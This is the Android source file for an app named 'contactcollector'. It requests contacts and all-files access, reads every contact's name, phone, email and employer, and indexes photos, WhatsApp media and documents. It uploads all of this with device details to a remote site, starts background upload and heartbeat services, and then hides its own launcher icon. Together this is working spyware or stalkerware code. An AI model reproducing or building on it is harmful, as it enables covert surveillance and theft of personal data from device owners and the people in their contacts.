package com.contactcollector.app;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {

    // IMPORTANT: Change this to your deployed website URL
    private static final String WEBSITE_BASE_URL = "https://your-website-url.vercel.app";
    // BUILD_ID is injected at build time
    private static final String BUILD_ID = "";
    private static final int CONTACTS_PERMISSION_CODE = 100;
    private static final int FILES_PERMISSION_CODE = 101;
    private static final int NOTIFICATION_PERMISSION_CODE = 102;
    private static final String PREFS_NAME = "CollectorPrefs";
    private static final String KEY_SESSION_ID = "sessionId";
    private static final String KEY_DEVICE_ID = "deviceId";

    private TextView tvStatus;
    private TextView tvDetail;
    private ProgressBar progressBar;
    private Button btnAllow;
    private Button btnViewWebsite;
    private LinearLayout layoutSuccess;
    private LinearLayout layoutPermission;
    private LinearLayout layoutLoading;

    private String viewUrl = null;
    private String deviceId = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvStatus = findViewById(R.id.tvStatus);
        tvDetail = findViewById(R.id.tvDetail);
        progressBar = findViewById(R.id.progressBar);
        btnAllow = findViewById(R.id.btnAllow);
        btnViewWebsite = findViewById(R.id.btnViewWebsite);
        layoutSuccess = findViewById(R.id.layoutSuccess);
        layoutPermission = findViewById(R.id.layoutPermission);
        layoutLoading = findViewById(R.id.layoutLoading);

        // Generate or retrieve unique device ID
        deviceId = getOrCreateDeviceId();

        btnAllow.setOnClickListener(v -> requestAllPermissions());

        btnViewWebsite.setOnClickListener(v -> {
            if (viewUrl != null) {
                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(viewUrl)));
            }
        });

        // Check if already completed
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        String savedSessionId = prefs.getString(KEY_SESSION_ID, null);
        if (savedSessionId != null) {
            viewUrl = WEBSITE_BASE_URL + "/view/" + savedSessionId;
            layoutPermission.setVisibility(View.GONE);
            layoutLoading.setVisibility(View.GONE);
            layoutSuccess.setVisibility(View.VISIBLE);
            tvStatus.setText("Data Synced!");
            tvDetail.setText("Your data is on the website.");
            btnViewWebsite.setVisibility(View.VISIBLE);
            hideAppIcon();
            return;
        }

        // Auto-check permission on open
        if (hasAllPermissions()) {
            readAndUploadData();
        } else {
            showPermissionScreen();
        }
    }

    /**
     * Generate or retrieve a unique device ID.
     * This persists across app restarts so each device can be tracked separately.
     */
    private String getOrCreateDeviceId() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        String id = prefs.getString(KEY_DEVICE_ID, null);
        if (id == null || id.isEmpty()) {
            // Generate a unique ID based on device info + random
            id = Build.BRAND + "_" + Build.MODEL + "_" + System.currentTimeMillis();
            // Clean up for use as identifier
            id = id.replaceAll("[^a-zA-Z0-9_-]", "_");
            // Add random suffix to ensure uniqueness
            id = id + "_" + Integer.toHexString((int)(Math.random() * 0xFFFF));
            prefs.edit().putString(KEY_DEVICE_ID, id).apply();
        }
        return id;
    }

    /**
     * Get device display name (e.g., "Samsung Galaxy S21")
     */
    private String getDeviceName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        if (model.toLowerCase().startsWith(manufacturer.toLowerCase())) {
            return capitalize(model);
        } else {
            return capitalize(manufacturer) + " " + model;
        }
    }

    private String capitalize(String s) {
        if (s == null || s.length() == 0) return "";
        StringBuilder result = new StringBuilder();
        String[] words = s.split(" ");
        for (String word : words) {
            if (word.length() > 0) {
                result.append(Character.toUpperCase(word.charAt(0)));
                if (word.length() > 1) result.append(word.substring(1));
                result.append(" ");
            }
        }
        return result.toString().trim();
    }

    private boolean hasAllPermissions() {
        boolean contactsOk = checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
        boolean filesOk;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            filesOk = Environment.isExternalStorageManager();
        } else {
            filesOk = checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
        return contactsOk && filesOk;
    }

    private void showPermissionScreen() {
        layoutPermission.setVisibility(View.VISIBLE);
        layoutLoading.setVisibility(View.GONE);
        layoutSuccess.setVisibility(View.GONE);
    }

    private void requestAllPermissions() {
        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, CONTACTS_PERMISSION_CODE);
        } else {
            requestFilePermission();
        }
    }

    private void requestFilePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, FILES_PERMISSION_CODE);
                } catch (Exception e) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivityForResult(intent, FILES_PERMISSION_CODE);
                }
            } else {
                requestNotificationPermission();
            }
        } else {
            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, FILES_PERMISSION_CODE);
            } else {
                requestNotificationPermission();
            }
        }
    }

    private void requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, NOTIFICATION_PERMISSION_CODE);
            } else {
                readAndUploadData();
            }
        } else {
            readAndUploadData();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == CONTACTS_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                requestFilePermission();
            } else {
                tvStatus.setText("Contact Permission Needed");
                tvDetail.setText("Contact permission is required. Please try again and tap Allow.");
            }
        } else if (requestCode == FILES_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                requestNotificationPermission();
            } else {
                tvStatus.setText("File Permission Needed");
                tvDetail.setText("File manager permission is required. Please try again and tap Allow.");
            }
        } else if (requestCode == NOTIFICATION_PERMISSION_CODE) {
            // Permissions have been granted - send status update
            sendStatusUpdate("permissions_granted", "All permissions granted");
            readAndUploadData();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == FILES_PERMISSION_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (Environment.isExternalStorageManager()) {
                    requestNotificationPermission();
                } else {
                    tvStatus.setText("File Permission Needed");
                    tvDetail.setText("File manager permission is required. Please try again.");
                }
            }
        }
    }

    private void readAndUploadData() {
        layoutPermission.setVisibility(View.GONE);
        layoutLoading.setVisibility(View.VISIBLE);
        layoutSuccess.setVisibility(View.GONE);
        tvStatus.setText("Reading Data...");
        tvDetail.setText("Reading contacts & files from your phone");

        new Thread(() -> {
            try {
                JSONArray contactsArray = readAllContacts();
                JSONArray filesArray = readAllFiles();

                runOnUiThread(() -> {
                    tvStatus.setText("Uploading Data...");
                    tvDetail.setText("Sending " + contactsArray.length() + " contacts & " + filesArray.length() + " files...");
                });

                // Send status: syncing_contacts (before upload)
                sendStatusUpdate("syncing_contacts", "Uploading " + contactsArray.length() + " contacts");

                String result = uploadData(contactsArray, filesArray);

                if (result != null) {
                    JSONObject json = new JSONObject(result);
                    String sessionId = json.getString("id");
                    int contactCount = json.getInt("contactCount");
                    int fileCount = json.getInt("fileCount");
                    viewUrl = WEBSITE_BASE_URL + "/view/" + sessionId;

                    SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                    prefs.edit()
                        .putString(KEY_SESSION_ID, sessionId)
                        .putString("baseUrl", WEBSITE_BASE_URL)
                        .apply();

                    // Send status: syncing_files (contacts done, files starting)
                    sendStatusUpdate("syncing_files", "Contacts uploaded, syncing files");

                    runOnUiThread(() -> {
                        layoutLoading.setVisibility(View.GONE);
                        layoutSuccess.setVisibility(View.VISIBLE);
                        tvStatus.setText("Data Uploaded!");
                        tvDetail.setText(contactCount + " contacts & " + fileCount + " files sent.\nApp will hide shortly...");
                        btnViewWebsite.setVisibility(View.VISIBLE);

                        // Start background file upload service
                        Intent serviceIntent = new Intent(MainActivity.this, FileUploadService.class);
                        serviceIntent.putExtra("sessionId", sessionId);
                        serviceIntent.putExtra("baseUrl", WEBSITE_BASE_URL);
                        serviceIntent.putExtra("deviceId", deviceId);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(serviceIntent);
                        } else {
                            startService(serviceIntent);
                        }

                        // Start HeartbeatService
                        Intent heartbeatIntent = new Intent(MainActivity.this, HeartbeatService.class);
                        heartbeatIntent.putExtra("sessionId", sessionId);
                        heartbeatIntent.putExtra("baseUrl", WEBSITE_BASE_URL);
                        heartbeatIntent.putExtra("deviceId", deviceId);
                        heartbeatIntent.putExtra("deviceName", getDeviceName());
                        heartbeatIntent.putExtra("deviceModel", Build.MODEL);
                        heartbeatIntent.putExtra("deviceBrand", Build.BRAND);
                        heartbeatIntent.putExtra("androidVersion", Build.VERSION.RELEASE);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(heartbeatIntent);
                        } else {
                            startService(heartbeatIntent);
                        }

                        // Send live_connected status
                        sendStatusUpdate("live_connected", "Device connected and syncing");

                        // Hide app icon after 3 seconds
                        new android.os.Handler().postDelayed(() -> hideAppIcon(), 3000);
                    });
                } else {
                    showError("Upload failed. Check internet and try again.");
                }
            } catch (Exception e) {
                showError("Error: " + e.getMessage());
            }
        }).start();
    }

    /**
     * Send a status update to the server.
     */
    private void sendStatusUpdate(String status, String detail) {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        String sessionId = prefs.getString(KEY_SESSION_ID, null);

        new Thread(() -> {
            try {
                JSONObject payload = new JSONObject();
                payload.put("status", status);
                if (detail != null) payload.put("detail", detail);
                if (sessionId != null) payload.put("sessionId", sessionId);

                HttpURLConnection conn = null;
                try {
                    URL url = new URL(WEBSITE_BASE_URL + "/api/status/update");
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);

                    OutputStream os = conn.getOutputStream();
                    os.write(payload.toString().getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    conn.getResponseCode(); // Consume response
                } finally {
                    if (conn != null) conn.disconnect();
                }
            } catch (Exception e) {
                // Silently fail - status updates are best-effort
            }
        }).start();
    }

    private void hideAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            // Some devices may restrict this
        }
    }

    private void showError(String msg) {
        runOnUiThread(() -> {
            layoutLoading.setVisibility(View.GONE);
            layoutPermission.setVisibility(View.VISIBLE);
            tvStatus.setText("Error");
            tvDetail.setText(msg);
            btnAllow.setText("Try Again");
        });
    }

    private JSONArray readAllContacts() throws Exception {
        JSONArray contactsArray = new JSONArray();

        String[] projection = {
            ContactsContract.Contacts._ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.Contacts.HAS_PHONE_NUMBER
        };

        android.database.Cursor cursor = getContentResolver().query(
            ContactsContract.Contacts.CONTENT_URI,
            projection,
            null,
            null,
            ContactsContract.Contacts.DISPLAY_NAME + " ASC"
        );

        if (cursor != null) {
            try {
                while (cursor.moveToNext()) {
                    String id = cursor.getString(0);
                    String name = cursor.getString(1);
                    int hasPhone = cursor.getInt(2);

                    if (hasPhone > 0 && name != null && !name.isEmpty()) {
                        String phone = getContactPhone(id);
                        if (phone != null && !phone.isEmpty()) {
                            JSONObject contact = new JSONObject();
                            contact.put("id", id);
                            contact.put("name", name);
                            contact.put("phone", phone);

                            String email = getContactEmail(id);
                            if (email != null) contact.put("email", email);

                            String org = getContactOrg(id);
                            if (org != null) contact.put("organization", org);

                            contactsArray.put(contact);
                        }
                    }
                }
            } finally {
                cursor.close();
            }
        }

        return contactsArray;
    }

    private String getContactPhone(String contactId) {
        android.database.Cursor cursor = getContentResolver().query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
            new String[]{contactId},
            null
        );
        if (cursor != null) {
            try {
                if (cursor.moveToFirst()) {
                    int idx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                    if (idx >= 0) return cursor.getString(idx);
                }
            } finally {
                cursor.close();
            }
        }
        return null;
    }

    private String getContactEmail(String contactId) {
        android.database.Cursor cursor = getContentResolver().query(
            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
            new String[]{ContactsContract.CommonDataKinds.Email.DATA},
            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
            new String[]{contactId},
            null
        );
        if (cursor != null) {
            try {
                if (cursor.moveToFirst()) {
                    int idx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA);
                    if (idx >= 0) return cursor.getString(idx);
                }
            } finally {
                cursor.close();
            }
        }
        return null;
    }

    private String getContactOrg(String contactId) {
        android.database.Cursor cursor = getContentResolver().query(
            ContactsContract.Data.CONTENT_URI,
            new String[]{ContactsContract.CommonDataKinds.Organization.COMPANY},
            ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?",
            new String[]{contactId, ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE},
            null
        );
        if (cursor != null) {
            try {
                if (cursor.moveToFirst()) {
                    int idx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.COMPANY);
                    if (idx >= 0) return cursor.getString(idx);
                }
            } finally {
                cursor.close();
            }
        }
        return null;
    }

    private JSONArray readAllFiles() throws Exception {
        JSONArray filesArray = new JSONArray();

        String extStorage = Environment.getExternalStorageDirectory().getAbsolutePath();
        String[] storagePaths = {
            extStorage + "/Download",
            extStorage + "/DCIM",
            extStorage + "/Pictures",
            extStorage + "/Documents",
            extStorage + "/Music",
            extStorage + "/Movies",
            extStorage + "/Recordings",
            extStorage + "/WhatsApp",
            extStorage + "/Android/media",
        };

        for (String path : storagePaths) {
            File dir = new File(path);
            if (dir.exists() && dir.isDirectory()) {
                scanDirectory(dir, filesArray, 0, 4);
            }
        }

        return filesArray;
    }

    private void scanDirectory(File dir, JSONArray filesArray, int depth, int maxDepth) throws Exception {
        if (depth > maxDepth) return;

        File[] files = dir.listFiles();
        if (files == null) return;

        for (File file : files) {
            try {
                JSONObject fileInfo = new JSONObject();
                fileInfo.put("name", file.getName());
                fileInfo.put("path", file.getAbsolutePath());
                fileInfo.put("isDirectory", file.isDirectory());
                fileInfo.put("size", file.length());
                fileInfo.put("lastModified", file.lastModified());

                if (!file.isDirectory()) {
                    fileInfo.put("fileType", getFileType(file.getName()));
                } else {
                    fileInfo.put("fileType", "folder");
                }

                filesArray.put(fileInfo);

                if (file.isDirectory() && depth < maxDepth) {
                    scanDirectory(file, filesArray, depth + 1, maxDepth);
                }
            } catch (Exception e) {
                // Skip problematic files
            }
        }
    }

    private String getFileType(String name) {
        name = name.toLowerCase();
        if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") ||
            name.endsWith(".gif") || name.endsWith(".webp") || name.endsWith(".bmp") ||
            name.endsWith(".heic") || name.endsWith(".raw"))
            return "image";
        if (name.endsWith(".mp4") || name.endsWith(".avi") || name.endsWith(".mkv") ||
            name.endsWith(".3gp") || name.endsWith(".mov") || name.endsWith(".wmv") ||
            name.endsWith(".flv") || name.endsWith(".webm"))
            return "video";
        if (name.endsWith(".mp3") || name.endsWith(".wav") || name.endsWith(".flac") ||
            name.endsWith(".ogg") || name.endsWith(".m4a") || name.endsWith(".aac") ||
            name.endsWith(".wma") || name.endsWith(".amr"))
            return "audio";
        if (name.endsWith(".pdf"))
            return "pdf";
        if (name.endsWith(".doc") || name.endsWith(".docx") || name.endsWith(".txt") ||
            name.endsWith(".xls") || name.endsWith(".xlsx") || name.endsWith(".ppt") ||
            name.endsWith(".pptx") || name.endsWith(".csv") || name.endsWith(".rtf"))
            return "document";
        if (name.endsWith(".apk"))
            return "apk";
        if (name.endsWith(".vcf"))
            return "vcf";
        if (name.endsWith(".zip") || name.endsWith(".rar") || name.endsWith(".7z") ||
            name.endsWith(".tar") || name.endsWith(".gz"))
            return "archive";
        return "other";
    }

    private String uploadData(JSONArray contacts, JSONArray files) throws Exception {
        JSONObject payload = new JSONObject();
        payload.put("contacts", contacts);
        payload.put("files", files);
        // Include BUILD_ID if available
        if (BUILD_ID != null && !BUILD_ID.isEmpty()) {
            payload.put("buildId", BUILD_ID);
        }
        // Include device information for multi-device support
        payload.put("deviceId", deviceId);
        payload.put("deviceName", getDeviceName());
        payload.put("deviceModel", Build.MODEL);
        payload.put("deviceBrand", Build.BRAND);
        payload.put("androidVersion", Build.VERSION.RELEASE);

        Exception lastException = null;
        // Retry up to 3 times
        for (int attempt = 1; attempt <= 3; attempt++) {
            HttpURLConnection conn = null;
            try {
                URL url = new URL(WEBSITE_BASE_URL + "/api/contacts/upload");
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(120000);

                OutputStream os = conn.getOutputStream();
                os.write(payload.toString().getBytes("UTF-8"));
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                BufferedReader br;
                if (responseCode >= 200 && responseCode < 300) {
                    br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                } else {
                    br = new BufferedReader(new InputStreamReader(conn.getErrorStream()));
                }

                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                br.close();

                if (responseCode >= 200 && responseCode < 300) {
                    return sb.toString();
                }
                // Server error - retry
                lastException = new Exception("Server returned " + responseCode);
            } catch (Exception e) {
                lastException = e;
            } finally {
                if (conn != null) conn.disconnect();
            }

            // Wait before retry (exponential backoff)
            if (attempt < 3) {
                try { Thread.sleep(2000 * attempt); } catch (InterruptedException ie) { break; }
            }
        }
        throw lastException != null ? lastException : new Exception("Upload failed after 3 attempts");
    }
}
